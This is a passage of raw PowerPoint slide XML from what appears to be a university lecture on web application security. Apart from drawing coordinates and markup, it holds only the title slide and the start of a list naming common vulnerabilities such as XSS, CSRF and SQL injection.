                    <a:pt x="647268" y="749300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="616712" y="774700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="586765" y="812800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="557466" y="850900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="528802" y="876300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="500786" y="914400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="473430" y="952500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="446735" y="990600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="420725" y="1028700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="395389" y="1066800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="370763" y="1104900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="346837" y="1143000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="323621" y="1181100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="301129" y="1219200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="279361" y="1257300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="258343" y="1295400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="238074" y="1333500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="218567" y="1371600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="199821" y="1422400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="181851" y="1460500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="164680" y="1498600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="148297" y="1549400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="132715" y="1587500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="117957" y="1625600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="104013" y="1676400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="90906" y="1714500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="78638" y="1765300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="67233" y="1803400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56680" y="1854200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="46990" y="1905000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38188" y="1943100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="30276" y="1993900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23253" y="2044700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17145" y="2082800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11938" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7670" y="2184400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4330" y="2222500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1930" y="2273300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="482" y="2324100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="2374900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="482" y="2425700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1930" y="2463800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4330" y="2514600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7670" y="2565400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11938" y="2616200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17145" y="2654300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23253" y="2705100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="30276" y="2755900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38188" y="2794000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="46990" y="2844800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56680" y="2895600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="67233" y="2933700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="78638" y="2984500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="90906" y="3022600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="104013" y="3073400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="117957" y="3111500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="132715" y="3162300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="148297" y="3200400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="164680" y="3238500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="181851" y="3289300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="199821" y="3327400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="218567" y="3365500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="238074" y="3403600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="258343" y="3454400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="279361" y="3492500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="301129" y="3530600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="323621" y="3568700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="346837" y="3606800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="370763" y="3644900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="395389" y="3683000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="420725" y="3721100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="446735" y="3759200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="473430" y="3797300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="500786" y="3835400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="528802" y="3860800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="557466" y="3898900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="586765" y="3937000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="616712" y="3962400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="647268" y="4000500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="678434" y="4038600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="710209" y="4064000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="742569" y="4102100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="775525" y="4127500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="809053" y="4152900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="843140" y="4191000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="877798" y="4216400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="912990" y="4241800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="948728" y="4267200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="984999" y="4292600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1059078" y="4343400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1135176" y="4394200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1213205" y="4445000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1252931" y="4457700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1333715" y="4508500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1374775" y="4521200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1416265" y="4546600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1458175" y="4559300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1500492" y="4584700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1543202" y="4597400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1898294" y="4699000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1944204" y="4699000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2036953" y="4724400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2083765" y="4724400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2130856" y="4737100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2609646" y="4737100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2656751" y="4724400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2703563" y="4724400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2796311" y="4699000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2842234" y="4699000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3197339" y="4597400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3240062" y="4584700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3282378" y="4559300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3324288" y="4546600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3365779" y="4521200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3406838" y="4508500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3487636" y="4457700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3527361" y="4445000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3605390" y="4394200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3681488" y="4343400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3755580" y="4292600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3791851" y="4267200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3827589" y="4241800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3862794" y="4216400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3897452" y="4191000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3931539" y="4152900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3965067" y="4127500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3998023" y="4102100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4030395" y="4064000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4062171" y="4038600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4093337" y="4000500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4123906" y="3962400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4153839" y="3937000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4183151" y="3898900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4211815" y="3860800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4239831" y="3835400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4267187" y="3797300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4293882" y="3759200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4319905" y="3721100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4345229" y="3683000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4369867" y="3644900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4393793" y="3606800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4417009" y="3568700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439501" y="3530600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4461268" y="3492500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4482287" y="3454400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4502556" y="3403600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4522076" y="3365500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4540821" y="3327400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4558779" y="3289300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4575962" y="3238500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4592345" y="3200400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4607928" y="3162300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4622685" y="3111500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4636630" y="3073400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4649736" y="3022600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4662005" y="2984500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4673422" y="2933700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4683976" y="2895600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4693653" y="2844800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4702454" y="2794000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4710379" y="2755900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4717402" y="2705100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4723511" y="2654300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4728705" y="2616200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4732985" y="2565400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4736325" y="2514600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4738725" y="2463800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4740173" y="2425700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4740656" y="2374900"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="006379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6" name="object 6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0610242" y="5432604"/>
              <a:ext cx="980794" cy="672221"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="object 7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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="object 8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15570">
              <a:lnSpc>
                <a:spcPts val="1240"/>
              </a:lnSpc>
            </a:pPr>
            <a:fld id="{81D60167-4931-47E6-BA6A-407CBD079E47}" type="slidenum">
              <a:rPr dirty="0" spc="-50"/>
              <a:t>2</a:t>
            </a:fld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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="object 5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15570">
              <a:lnSpc>
                <a:spcPts val="1240"/>
              </a:lnSpc>
            </a:pPr>
            <a:fld id="{81D60167-4931-47E6-BA6A-407CBD079E47}" type="slidenum">
              <a:rPr dirty="0" spc="-50"/>
              <a:t>2</a:t>
            </a:fld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145"/>
              <a:t>COMMON</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-45"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-50"/>
              <a:t>WEB</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-45"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>APP</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-125"/>
              <a:t>VULNERABILITIES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962050" y="1533220"/>
            <a:ext cx="10211435" cy="3776979"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="55244" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="12700" marR="5080">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="434"/>
              </a:spcBef>
            </a:pP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In</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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remaining</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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slides,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-2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we</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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will</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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focus</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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on</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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a</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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(small)</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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subset</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-2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25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>of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vulnerabilies,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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that</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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occur</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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frequently</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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in</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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applications,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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can</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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cause</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>very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serious</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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damage,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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and</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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can</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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be</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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easily</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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mitigated</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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or</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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prevented!</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="670"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-30">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Cross-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site</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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Scripting</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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(</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>XSS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)</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="660"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-30">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Cross-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site</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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Request</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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Forgery</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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(</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>XSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-65" b="1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or</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>CSRF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)</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="660"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pP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SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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Injections</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="675"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pP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Session</a:t>
            </a:r>
            <a:r>
